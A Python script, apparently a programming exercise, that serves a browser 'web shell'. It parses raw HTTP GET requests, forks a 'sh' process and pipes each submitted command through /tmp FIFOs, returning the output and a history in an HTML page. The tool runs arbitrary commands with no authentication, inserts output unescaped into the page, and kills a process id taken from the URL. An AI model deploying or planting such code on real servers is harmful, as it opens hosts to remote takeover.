import json
from select import select
from signal import SIGKILL
import time 
import os
import sys

res = """
HTTP/1.1 200 
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 1000

<!DOCTYPE html>
<html>
<head>
    <title>WEB SHELL !!!!</title>
</head>
<body style="background-color:black;color:#00FA16">
	<h1 style="text-align:center"><strong><u>WEB SHELL</strong></u></h1><br>
	<h3><u>HISTORY</u></h3> 
	$(HISTORY)<br>
	<h3><u>LAST CMD : </u>$(DATA)</h3><br>
	<form style="background-color:black;color:#00FA16" action="ajoute$(ID_SESSION)" method="get">
		<input type="text"  style="border:3px solid #46C786;border-radius:10px;width:200px;box-shadow:1px 1px 2px #C0C0C0 inset;" name="saisie" placeholder="Tapez une commande" />
		<input type="submit" name="send" value="&#9166;">
	</form>
	<h3><u>RES CMD :</u></h3> 
	$(RES)
</body>
</html>
""" 
def escaped_latin1_to_utf8(s):
	res = ''
	i = 0
	while i < len(s):
		if s[i] == '%':
			res += chr(int(s[i+1:i+3], base=16))
			i += 3
		else :
			res += s[i]
		i += 1
	return res
def read_file (fd) :
	is_error = False
	reading = True
	is_none = 0 
	read = bytes('', "utf8")
	while (reading) :
		try :
			inter = os.read(fd, 4096) 
			read += inter 
			if (is_none > 10) :
				reading = False
			elif (inter == b''):
				is_none += 1 
				time.sleep(0.2)
		except :
			if (is_error) :
				reading = False
			is_error = True
	res =  str(read.decode('utf8'))
	return (res)
def get_paquet_type(msg) :
	return (msg.decode('utf8').split("\r")[0].split(' ')[0])
def get_paquet_prot(msg) :
	return (msg.decode('utf8').split('\r')[0].split(' ')[2]);
def get_paquet_data(msg) :
	return(msg.decode('utf8').split("\r")[0].split(' ')[1])
def get_acceptHTML(msg) :
	return (msg.decode('utf8').split('\r')[3].split(' ')[1].split(',')[0])
def	get_cmd() :
	id_session = ''
	msg = os.read(0, 100000) #READ PAQUET
	os.write(2, msg)
	if (get_paquet_type(msg) != "GET" or get_paquet_prot(msg) != 'HTTP/1.1') : #IS GOOD PAQUET
		os.write(2, b"request not supported\n")
	elif (get_acceptHTML(msg) != 'text/html'):
		#os.write(2, b"NOT HTML/TEXT SUPPORT\n")
		os.close (0)
		sys.exit (0)
	else :
		#EXTRACT DATA
		data = ''
		if (len(get_paquet_data(msg).split("?")) > 1) :
			data = get_paquet_data(msg).split("?")[1].split("&")[0].split("=")[1].replace('+', ' ')
			data = escaped_latin1_to_utf8(data)
		if (len(get_paquet_data(msg).split("?")) > 1) :
			id_session = get_paquet_data(msg).split("?")[0].replace("ajoute", "").replace("/", "")
		#CHECK IF CMD IS EXIT
		if (data.split(' ')[0].lower() == 'exit') :
			os.kill(int(id_session), SIGKILL)
			id_session = ''
			data = ''
	#CREATE RETURN PAQUET
		msg = res.replace("$(DATA)", data)
		pid = -1 #PID CHILD
		if (len(id_session) == 0) :
			id_session = str(os.getpid())
			pid = os.fork()
			#CREATE PROCESS SHELL
			if (pid == 0) :
				#PIPES
				os.mkfifo("/tmp/shell_vers_traitement" + (id_session))
				os.mkfifo("/tmp/traitement_vers_shell" + (id_session))	
				os.dup2(os.open("/tmp/traitement_vers_shell" + (id_session), os.O_RDONLY), 0)
				fd_out = os.open("/tmp/shell_vers_traitement" + (id_session), os.O_WRONLY)
				os.dup2(fd_out, 1)
				os.dup2(fd_out, 2)
				os.execvp("sh", ["sh"])
			elif (pid == -1) : #FORK ERROR
				exit (0)
		msg = msg.replace("$(ID_SESSION)", id_session)
		#OPEN FILES HISTORY AND PIPE
		files_created = 0
		fd_fifo_in = -1
		fd_fifo_out = -1
		while (not(files_created)) : #WAIT/OPEN FIFOS 
			try : 
				fd_fifo_out = os.open("/tmp/traitement_vers_shell" + (id_session), os.O_WRONLY)
				fd_fifo_in = os.open("/tmp/shell_vers_traitement" + (id_session), os.O_RDONLY | os.O_NONBLOCK)
				files_created = 1
			except :
				files_created = 0
		#Extract and write HISTORY IN SOCKET
		fd_history = os.open("/tmp/historique" + str(id_session) + ".txt", os.O_CREAT | os.O_APPEND | os.O_RDWR | os.O_NONBLOCK)
		history = read_file(fd_history)
		msg = msg.replace("$(HISTORY)", history.replace("\n", "<br>"))
		#WRITE IN HISTORY FILE AND IN PIPE TO SHELL
		if (len(data) > 0) :
			os.write(fd_history, bytes(data,'utf8'))
			os.write(fd_history, bytes('\n', 'utf8'))
			os.write(fd_fifo_out, bytes(data, 'utf8'))
			os.write(fd_fifo_out, bytes("\n", 'utf8'))
			time.sleep(0.5)
		#WRITE RES
		if (len(data) > 0) :
			shell_res = read_file(fd_fifo_in)
			msg = msg.replace("$(RES)" ,shell_res.replace("\n", "<br>"))
			os.close (fd_fifo_in)
			os.close (fd_fifo_out)
		else : #KEEP PROCESS ALIVE AND WAIT END SH
			os.write(1, bytes(msg.replace("$(RES)", ""), 'utf8')) #WRITE PAQUET
			os.close (0)
			os.close (1)
			os.close (2)
			os.close (fd_fifo_in)
			os.waitpid(pid, 0)
		os.write(1, bytes(msg, 'utf8')) #WRITE PAQUET
		os.close(0)
	
if __name__ == "__main__" :
	get_cmd()
	sys.exit (0)